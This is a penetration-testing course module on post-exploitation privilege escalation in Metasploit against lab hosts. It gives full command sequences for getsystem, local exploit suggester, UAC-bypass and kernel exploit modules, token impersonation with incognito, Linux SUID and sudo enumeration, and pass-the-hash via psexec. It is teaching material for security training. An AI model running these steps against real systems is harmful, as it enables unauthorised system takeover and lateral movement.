# Module 11 — Privilege Escalation (1)

> 🔴 **Advanced Level** | Escalate from low-privilege user to SYSTEM or root
> 

---

# 🔑 Privilege Escalation

## 🤔 What is Privilege Escalation?

**Privilege escalation** is the process of gaining higher-level permissions than you were initially granted after compromising a target.

```
Initial access:   user account (limited access)
     │
     v
Priv Esc:         SYSTEM or root (full control)
```

**Two types:**

- **Local Privilege Escalation (LPE)** — Escalate on the machine you're already on
- **Horizontal Escalation** — Access other user accounts at the same level

---

## 🔍 Step 1: Find Privilege Escalation Opportunities

```bash
# The most important post module for privesc:
meterpreter > run post/multi/recon/local_exploit_suggester

# Output:
# [*] 192.168.1.20 - Collecting local exploits for x86/windows...
# [*] 40 exploit checks are being tried...
# [+] exploit/windows/local/ms10_015_kitrap0d: The service is running!
# [+] exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
# [+] exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
# [+] exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
```

---

## 🚀 Method 1: getsystem (Automatic)

```bash
# Try all built-in privilege escalation techniques at once:
meterpreter > getsystem

# Techniques tried:
# 1. Named Pipe Impersonation (In Memory/Admin)
# 2. Named Pipe Impersonation (Dropper/Admin)
# 3. Token Duplication (In Memory/Admin)
# 4. Named Pipe Impersonation (RPCSS variant)

# Success output:
# ...got system via technique 1 (Named Pipe Impersonation)

# Verify:
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
```

---

## 🚀 Method 2: Local Exploit Modules

```bash
# After local_exploit_suggester identifies candidates:

# Background current session:
meterpreter > background

# Use identified exploit:
msf6 > use exploit/windows/local/ms10_015_kitrap0d
msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 1
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LHOST 192.168.1.10
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 5555
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

# Other common Windows local exploits:
use exploit/windows/local/bypassuac              # Bypass UAC
use exploit/windows/local/bypassuac_fodhelper    # UAC bypass
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
use exploit/windows/local/ms14_058_track_popup_menu
use exploit/windows/local/ms15_051_client_copy_image
```

---

## 🚀 Method 3: Linux Privilege Escalation

```bash
# Check Linux kernel version:
meterpreter > shell
uname -a
# Linux metasploitable 2.6.24-16-server #1 SMP

# Search for kernel exploits:
msf6 > search platform:linux type:exploit local

# Common Linux local exploits:
use exploit/linux/local/udev_netlink
use exploit/linux/local/overlayfs_priv_esc
use exploit/linux/local/pkexec            # PwnKit (CVE-2021-4034)
use exploit/linux/local/sudo_baron_samedit # CVE-2021-3156

# Check SUID binaries from shell:
find / -perm -u=s -type f 2>/dev/null

# Check sudo rights:
sudo -l

# Check writable cron jobs:
ls -la /etc/cron*
```

---

## 📚 Token Impersonation (Windows)

```bash
# Load incognito module:
meterpreter > load incognito

# List available tokens:
meterpreter > list_tokens -u
# Output:
# Delegation Tokens Available
# ========================================
# NT AUTHORITY\SYSTEM
# WINXP\Administrator
# WINXP\john

# Impersonate a token:
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM

# Revert to original token:
meterpreter > rev2self
```

---

## 📊 Privilege Escalation Checklist

```
Windows:
☑ Run getsystem (try all techniques)
☑ Run local_exploit_suggester
☑ Check UAC level (use bypassuac modules)
☑ Check token impersonation (load incognito)
☑ Check unquoted service paths
☑ Check AlwaysInstallElevated registry key
☑ Check weak service permissions

Linux:
☑ Check kernel version for local exploits
☑ Check SUID/SGID binaries
☑ Check sudo -l for allowed commands
☑ Check writable /etc/passwd
☑ Check cron jobs
☑ Check running services as root
☑ Check NFS shares (no_root_squash)
```

---

> ✅ **Privilege escalation mastered! Now create custom payloads with msfvenom.**
> 

---

## Enhancement — local_exploit_suggester Workflow (added)

```bash
meterpreter > run post/multi/recon/local_exploit_suggester
[*] 192.168.1.20 - Collecting local exploits for x86/windows...
[*] 40 exploit checks are being tried...
```

Automates the "which privesc exploit might work here" question by running every relevant local-exploit module's `check` against the current session — far faster than manually trying modules one at a time. Still requires `getuid` before and after any suggested exploit to confirm actual privilege change, since a reported "likely vulnerable" isn't the same as confirmed exploitation. This connects to the Analysing a Finding and Confirming Exploitability module in the Exploitation & Weaponisation course, which covers the general discipline of confirming before acting.

---

## Enhancement — UAC Bypass, Access Token Theory & Pass-the-Hash (added, from the INE MSF course deck)

### Bypassing UAC

User Account Control (UAC), introduced in Windows Vista, requires administrator approval for OS-level changes — even when the current user account is technically an admin. A UAC bypass module exploits this gap between "admin account" and "elevated process":

```bash
meterpreter > background
msf6 > use exploit/windows/local/bypassuac_injection
msf6 exploit(windows/local/bypassuac_injection) > set SESSION 1
msf6 exploit(windows/local/bypassuac_injection) > set LHOST 192.168.1.10
msf6 exploit(windows/local/bypassuac_injection) > run
```

The "In Memory Injection" variant uses a trusted publisher certificate via process injection to spawn a second shell with the UAC flag turned off — no new file written to disk, which is why this specific technique is harder for file-based AV to catch than older UAC-bypass methods.

### Windows Access Token Theory

Access tokens are the core of Windows authentication, created and managed by LSASS (Local Security Authority Subsystem Service). A token identifies the security context of a process/thread — conceptually like a session cookie: it grants access without re-presenting credentials on every action. `winlogon.exe` generates the token at login; it attaches to `userinit.exe`, and every child process inherits a copy.

Tokens come in two security levels:

| Token Type | Created By | Impersonation Scope |
| --- | --- | --- |
| **Impersonate-level** | Non-interactive login (services, domain logons) | Local system only |
| **Delegate-level** | Interactive login (console, RDP) | **Any system** — the higher-value target |

Three privileges matter for token-impersonation attacks:

| Privilege | Grants |
| --- | --- |
| `SeAssignPrimaryToken` | Impersonate tokens |
| `SeCreateToken` | Create an arbitrary token with admin privileges |
| `SeImpersonatePrivilege` | Create a process under another user's security context (commonly admin) |

### The Incognito Module in Practice

Incognito (originally a standalone tool, now built into Meterpreter) lets you list and impersonate available tokens without needing the target user's password:

```bash
meterpreter > load incognito
meterpreter > list_tokens -u
# Delegation Tokens Available
# NT AUTHORITY\SYSTEM
# DOMAIN\Administrator
meterpreter > impersonate_token "DOMAIN\\Administrator"
meterpreter > getuid
# Server username: DOMAIN\Administrator
meterpreter > rev2self
# Reverts to your original token
```

This only works if a Delegate-level token for the target account is already present in memory on this host — typically because that user has an active session, an RDP connection, or a scheduled task running as them.

### Pass-the-Hash with PsExec

Pass-the-hash (PtH) uses a captured NTLM hash directly for authentication — no password cracking needed, because NTLM authentication accepts the hash itself as the credential:

```bash
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.20
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 exploit(windows/smb/psexec) > set LHOST 192.168.1.10
msf6 exploit(windows/smb/psexec) > run
```

The `SMBPass` field accepts the LM:NTLM hash pair directly in place of a cleartext password — this is legitimate SMB authentication, not an exploit of a vulnerability, which is why PsExec-based PtH typically lands you access via valid credentials rather than through a crash-prone memory-corruption bug. This pairs naturally with `hashdump`/Kiwi from Module 10: dump hashes on one host, pass them to authenticate on another, chaining lateral movement exactly as described in the Vulnerability Chaining module of the Exploitation & Weaponisation course.